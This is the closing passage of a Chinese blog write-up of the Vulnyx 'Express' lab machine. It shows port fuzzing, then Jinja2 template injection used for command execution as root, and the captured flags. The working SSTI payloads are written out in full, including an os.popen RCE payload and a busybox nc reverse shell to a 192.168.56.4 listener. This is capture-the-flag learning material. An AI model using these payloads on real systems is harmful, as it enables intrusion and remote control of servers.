class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n :: \u003cspan class=\"hljs-title class_\"\u003eCalibration\u003c/span\u003e      : \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n :: \u003cspan class=\"hljs-title class_\"\u003eTimeout\u003c/span\u003e          : \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e\n :: \u003cspan class=\"hljs-title class_\"\u003eThreads\u003c/span\u003e          : \u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e\n :: \u003cspan class=\"hljs-title class_\"\u003eMatcher\u003c/span\u003e          : \u003cspan class=\"hljs-title class_\"\u003eResponse\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003estatus\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e299\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e307\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e401\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e405\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e\n :: \u003cspan class=\"hljs-title class_\"\u003eFilter\u003c/span\u003e           : \u003cspan class=\"hljs-title class_\"\u003eResponse\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ewords\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e\n________________________________________________\n\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e                      [\u003cspan class=\"hljs-title class_\"\u003eStatus\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eSize\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e175\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eWords\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eLines\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eDuration\u003c/span\u003e: 96ms]\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e                      [\u003cspan class=\"hljs-title class_\"\u003eStatus\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eSize\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e11239\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eWords\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3439\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eLines\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eDuration\u003c/span\u003e: 4036ms]\n\u003cspan class=\"hljs-number\"\u003e5000\u003c/span\u003e                    [\u003cspan class=\"hljs-title class_\"\u003eStatus\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eSize\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e300\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eWords\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eLines\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eDuration\u003c/span\u003e: 378ms]\n\u003cspan class=\"hljs-number\"\u003e9000\u003c/span\u003e                    [\u003cspan class=\"hljs-title class_\"\u003eStatus\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eSize\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e279\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eWords\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eLines\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e, \u003cspan class=\"hljs-title class_\"\u003eDuration\u003c/span\u003e: 160ms]\n:: \u003cspan class=\"hljs-title class_\"\u003eProgress\u003c/span\u003e: [\u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e] :: \u003cspan class=\"hljs-title class_\"\u003eJob\u003c/span\u003e [\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e] :: \u003cspan class=\"hljs-number\"\u003e183\u003c/span\u003e req/sec :: \u003cspan class=\"hljs-title class_\"\u003eDuration\u003c/span\u003e: [\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] :: \u003cspan class=\"hljs-title class_\"\u003eErrors\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ::\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e构造访问这俩端口\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e5000\u003c/code\u003e端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxExpress/image26.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e9000\u003c/code\u003e端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxExpress/image27.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e\u0026#x3C;form method=\u003cspan class=\"hljs-string\"\u003e\"get\"\u003c/span\u003e action=\u003cspan class=\"hljs-string\"\u003e\"/username\"\u003c/span\u003e\u003e\n    \u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026#x3C;\u003cspan class=\"hljs-name\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eplaceholder\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"Enter your name\"\u003c/span\u003e\u003e\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026#x3C;\u003cspan class=\"hljs-name\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"submit\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"Greet\"\u003c/span\u003e\u003e\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026#x3C;/\u003cspan class=\"hljs-name\"\u003eform\u003c/span\u003e\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e9000\u003c/code\u003e端口可以继续构造，\u003ccode\u003eusername\u003c/code\u003e随便输入点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxExpress/image28.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以成功回显，尝试模板注入，成功\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxExpress/image29.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eSSTI\u003c/h2\u003e\n\u003cp\u003e判断注入类型 \u003ca href=\"https://blog.csdn.net/Manuffer/article/details/120739989\"\u003ehttps://blog.csdn.net/Manuffer/article/details/120739989\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e\u003cspan class=\"hljs-attr\"\u003ehttp\u003c/span\u003e:\u003cspan class=\"hljs-comment\"\u003e//127.0.0.1:9000/username?name={{7*'7'}}\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// ouput\u003c/span\u003e\n\u003cspan class=\"hljs-title class_\"\u003eHello\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e7777777\u003c/span\u003e!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么就是\u003ccode\u003ejinja2\u003c/code\u003e和\u003ccode\u003eTwig\u003c/code\u003e了。构造\u003ccode\u003epayload\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e\u003cspan class=\"hljs-attr\"\u003ehttp\u003c/span\u003e:\u003cspan class=\"hljs-comment\"\u003e//127.0.0.1:9000/username?name={{self.__class__}}\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// output\u003c/span\u003e\n\u003cspan class=\"hljs-title class_\"\u003eHello\u003c/span\u003e, \u0026#x26;lt;\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u0026#x26;#\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e;jinja2.\u003cspan class=\"hljs-property\"\u003eruntime\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003eTemplateReference\u003c/span\u003e\u0026#x26;#\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e;\u0026#x26;gt;!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以确定是\u003ccode\u003ejinja2\u003c/code\u003e ，构造可执行语句\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e\u003cspan class=\"hljs-attr\"\u003ehttp\u003c/span\u003e:\u003cspan class=\"hljs-comment\"\u003e//127.0.0.1:9000/username?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// output\u003c/span\u003e\n\u003cspan class=\"hljs-title class_\"\u003eHello\u003c/span\u003e, uid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) gid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) groups=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root)\\n!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e构造反弹\u003ccode\u003eshell\u003c/code\u003e ，同时\u003ccode\u003ekali\u003c/code\u003e开启监听，获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e\u003cspan class=\"hljs-attr\"\u003ehttp\u003c/span\u003e:\u003cspan class=\"hljs-comment\"\u003e//127.0.0.1:9000/username?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.56.4 1234 -e /bin/bash').read()}}\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// output\u003c/span\u003e\n⚡ root@kali  ~\u003cspan class=\"hljs-regexp\"\u003e/Desktop/\u003c/span\u003e\u003cspan class=\"hljs-title class_\"\u003eTools\u003c/span\u003e/\u003cspan class=\"hljs-title class_\"\u003eSSTImap\u003c/span\u003e  nc -lvnp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\nlistening on [any] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e] \u003cspan class=\"hljs-title function_\"\u003efrom\u003c/span\u003e (\u003cspan class=\"hljs-variable constant_\"\u003eUNKNOWN\u003c/span\u003e) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.36\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e58096\u003c/span\u003e\nid\nuid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) gid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) groups=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eRootFlag \u0026#x26; UserFlag\u003c/h2\u003e\n\u003cp\u003e我以为还需要搞提权的，但是直接就是\u003ccode\u003eroot\u003c/code\u003e了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003ecat r00t.\u003cspan class=\"hljs-property\"\u003etxt\u003c/span\u003e\n17a0c0830e9c71623d17b30f5a2fc40a\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003ecat user.\u003cspan class=\"hljs-property\"\u003etxt\u003c/span\u003e\n969dadb2e8f4aadb8291a496e6c75b35\n\u003c/code\u003e\u003c/pre\u003e","title":"Vulnyx - Express","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["Vulnyx","Linux靶机"],"categories":"靶机","description":"Express Difficulty: Medium 前期踩点 36是靶机 没扫描出扫描漏洞，优先级8022 访问HTTP服务，并检测指纹，默认页面 没信息，先扫描一下目录，耶？也没什么信息耶 一点信息没有，最后得知作者并没有提示我们域名，但是可以在vulnyx的规则上找到https://vulny..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"VulnyxExpress"},"buildId":"rBOAoH_mNY0kmuqb3_RcF","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>